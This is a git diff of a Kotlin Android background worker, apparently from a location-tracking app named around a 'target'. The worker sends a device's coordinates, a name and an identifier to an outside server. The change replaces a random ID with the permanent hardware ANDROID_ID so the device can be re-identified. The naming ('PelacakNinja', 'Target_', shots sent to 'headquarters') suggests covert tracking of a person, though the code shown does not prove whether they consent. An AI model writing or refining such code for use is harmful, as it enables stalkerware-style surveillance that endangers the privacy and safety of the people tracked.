@@ -1,5 +1,6 @@
 package com.hanafi.han
 
+import android.provider.Settings
 import android.annotation.SuppressLint
 import android.content.Context
 import android.util.Log
@@ -43,26 +44,24 @@ class LocationWorker(appContext: Context, workerParams: WorkerParameters) : Coro
     private suspend fun kirimKeServer(lat: Double, lon: Double) {
         withContext(Dispatchers.IO) {
             try {
-                // 1. Membaca "Brankas Lokal" di HP untuk mencari ID dan Nama
+                // 1. Ambil "Nomor Rangka Mesin" asli dari HP (Permanent Phone ID)
+                val androidId = Settings.Secure.getString(applicationContext.contentResolver, Settings.Secure.ANDROID_ID)
+                
+                // Ambil 6 huruf/angka pertama saja agar rapi, contoh: "HP_A1B2C3"
+                val idUnik = androidId?.take(6)?.uppercase() ?: "UNKNOWN"
+                val targetId = "HP_$idUnik"
+
+                // 2. Membaca "Brankas Lokal" di HP hanya untuk mencari Nama Custom (jika ada)
                 val sharedPref = applicationContext.getSharedPreferences("PelacakPrefs", Context.MODE_PRIVATE)
-
-                // 2. Cek apakah HP ini sudah punya ID Permanen?
-                var targetId = sharedPref.getString("id_target", null)
-                if (targetId == null) {
-                    // Jika belum punya, buatkan ID acak dan simpan permanen
-                    val idAcak = java.util.UUID.randomUUID().toString().substring(0, 4).uppercase()
-                    targetId = "Target_$idAcak"
-                    sharedPref.edit().putString("id_target", targetId).apply()
-                }
-
-                // 3. Ambil nama dari inputan (jika kosong, gunakan ID target tadi)
                 var targetNama = sharedPref.getString("nama_input", "")
+
+                // 3. Jika nama kosong, gunakan Phone ID sebagai nama
                 if (targetNama.isNullOrEmpty()) {
                     targetNama = targetId
                 }
 
                 // 4. Enkripsi nama agar aman dikirim lewat URL (menghindari error karena spasi)
-                val namaAman = java.net.URLEncoder.encode(targetNama ?: "Anonim", "UTF-8")
+                val namaAman = java.net.URLEncoder.encode(targetNama, "UTF-8")
 
                 // 5. Merakit peluru (URL Tembakan Baru)
                 val urlServer = "https://mymaps.hanavy.online/api/update?id=$targetId&nama=$namaAman&lat=$lat&lon=$lon"
@@ -74,7 +73,7 @@ class LocationWorker(appContext: Context, workerParams: WorkerParameters) : Coro
                 connection.connectTimeout = 5000 // Batas waktu tunggu 5 detik
                 
                 val responseCode = connection.responseCode
-                Log.d("PelacakNinja", "Status Tembakan ke Markas: $responseCode")
+                Log.d("PelacakNinja", "Status Tembakan Permanen ($targetId) ke Markas: $responseCode")
                 
                 connection.disconnect()
                 // ===================================================
